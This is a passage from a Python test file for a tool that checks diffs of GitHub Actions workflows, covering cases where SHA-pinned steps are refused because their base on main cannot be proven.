            f"b/{path}",
        )
    )
    diff = f"diff --git a/{path} b/{path}\n{body}"
    assert "uses: fake/action" in diff
    assert _check(diff).returncode == 1


def test_refuses_a_nested_run_line_when_main_has_moved_the_file(tmp_path):
    result = _check_in_repo(
        tmp_path,
        NESTED_IN_RUN.format(sha=SHA),
        NESTED_IN_RUN.format(sha=OTHER_SHA),
        base=NESTED_IN_RUN.format(sha=SHA) + "# moved on main\n",
    )
    assert result.returncode == 1, result.stdout


def test_names_the_unproven_base_when_refusing(tmp_path):
    # A workflow whose base cannot be proven is refused as a whole, and says
    # so, rather than only withholding pin normalization from its lines.
    result = _check_in_repo(
        tmp_path,
        STEP_WITH_COMMENT.format(sha=SHA),
        STEP_WITH_COMMENT.format(sha=OTHER_SHA),
        base=STEP_WITH_COMMENT.format(sha=SHA) + "# moved on main\n",
    )
    assert result.returncode == 1
    assert "could not be proven" in result.stdout
